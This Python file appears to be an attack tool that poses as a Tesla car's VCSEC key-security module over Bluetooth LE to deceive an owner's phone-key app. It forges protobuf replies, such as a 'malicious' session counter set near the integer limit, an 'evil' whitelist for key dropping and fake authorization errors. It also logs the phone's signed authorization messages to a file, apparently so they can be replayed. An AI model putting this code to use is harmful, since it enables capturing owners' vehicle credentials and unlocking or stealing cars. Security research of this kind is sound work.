from pybleno.hci_socket import Emit
import VCSEC_pb2 as VCSEC
from google.protobuf.text_format import MessageToString

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def getCommandStatusConfirmation(cnt):
    msgStatus = VCSEC.SignedMessage_status(counter=cnt)
    cmdStatus = VCSEC.CommandStatus(signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getCommandStatusError1(cnt):
    msgStatus = VCSEC.SignedMessage_status(counter=cnt,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_NOT_ON_WHITELIST)
    cmdStatus = VCSEC.CommandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getCommandStatusError2(cnt):
    msgStatus = VCSEC.SignedMessage_status(counter=cnt,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_IV_SMALLER_THAN_EXPECTED)
    cmdStatus = VCSEC.CommandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getMaliciousSessionCounter(phoneType):
    
    val=0

    if (phoneType==1): 
        val = 4294967293

    else:
        val = 2147483645
    
    sessInfo = VCSEC.SessionInfo(counter = val) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(sessionInfo=sessInfo)
    return fromVcsecMsg

def getAuthorizationRequest(adToken):
    msgStatus = VCSEC.signedMessage_status(counter=adToken,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_NOT_ON_WHITELIST)
    cmdStatus = VCSEC.commandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getHexString(messageBytes,strip):
    if (strip==1):
        array = messageBytes[2 : ]
    else:
        array = messageBytes

    return ''.join(format(x, '02x') for x in array)


def getOutputStringTV(messageBytes,human):
    array = messageBytes[2 : ]
    if (human==1):
        temp = VCSEC.ToVCSECMessage()
        temp.ParseFromString(array)
        return (MessageToString(temp, as_utf8=True)+"\n"+''.join(format(x, '02x') for x in array)+"\n")
    else:
        return ''.join(format(x, '02x') for x in array)

def getOutputStringFV(messageBytes,human):
    array = messageBytes[2 : ]
    if (human==1):
        temp = VCSEC.FromVCSECMessage()
        temp.ParseFromString(array)
        return (MessageToString(temp, as_utf8=True)+"\n"+''.join(format(x, '02x') for x in array)+"\n")
    else:
        return ''.join(format(x, '02x') for x in array)

def getPrefix(length):
    return length.to_bytes(2, byteorder='big', signed=False)

def getSerializedMessage(protoMsg):
    messagebytes = protoMsg.SerializeToString()
    prefixbytes = getPrefix(len(messagebytes))
    return prefixbytes + messagebytes

class Tesla():
    def __init__(self,vehicleConfig):
        self.vehicleConfig = vehicleConfig
        self.cryptoCounter=0
        self.messagelist = []
        self.messagelist.append(bytearray.fromhex('00041a021802'))
        self.keydrop=0
        self.cryptocounter=0
        self.human=1
        self.targetPhoneType=0

    def toggleKeydropBit(self):
        if (self.keydrop==0):
            self.keydrop=1
        else:
            self.keydrop=0

    def toggleTargetPhoneType(self):
        if (self.targetPhoneType==0):
            self.targetPhoneType=1
        else:
            self.targetPhoneType=0

    def toggleCryptoCounterBit(self):
        if (self.cryptocounter==0):
            self.cryptocounter=1
        else:
            self.cryptocounter=0

    def toggleHumanBit(self):
        if (self.human==0):
            self.human=1
        else:
            self.human=0

    def handleMessage(self, data):
        vcsecMessage = VCSEC.ToVCSECMessage()
        vcsecMessage.ParseFromString(data[2 : ]) # strip length header
        if (vcsecMessage.unsignedMessage.HasField("InformationRequest")):
            if (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_WHITELIST_INFO):
                if(self.keydrop==1):
                    self.messagelist.append(bytearray.fromhex(self.vehicleConfig['evilWhitelist']))
            elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_EPHEMERAL_PUBLIC_KEY):
                self.messagelist.append(bytearray.fromhex(self.vehicleConfig['pubkeyResponse']))
            elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_CAPABILITIES):
                self.messagelist.append(bytearray.fromhex('00079a010408011001')) # generic capabilities response
            elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_COUNTER):
                if(self.cryptocounter==1):
                    self.messagelist.append(getSerializedMessage(getMaliciousSessionCounter(self.targetPhoneType))) 
            else:
                self.messagelist.append(bytearray.fromhex('00041a021802'))
                self.messagelist.append(bytearray.fromhex('000a0a080a02300310011802'))
        elif (vcsecMessage.HasField("signedMessage")):
            self.cryptoCounter = vcsecMessage.signedMessage.counter
            if (getOutputStringTV(data,1).find("signatureType")>0):
                # save received message to file
                authFile = open("auth_codes.txt","a")
                authFile.write(getHexString(data,0)+"\n")

            if(self.keydrop==1):
                self.messagelist.append(getSerializedMessage(getCommandStatusError1(self.cryptoCounter)))
            elif(self.cryptocounter==1):
                self.messagelist.append(getSerializedMessage(getCommandStatusError2(self.cryptoCounter)))
            else:
                self.messagelist.append(getSerializedMessage(getCommandStatusConfirmation(self.cryptoCounter)))
        pass

Emit.Patch(Tesla)
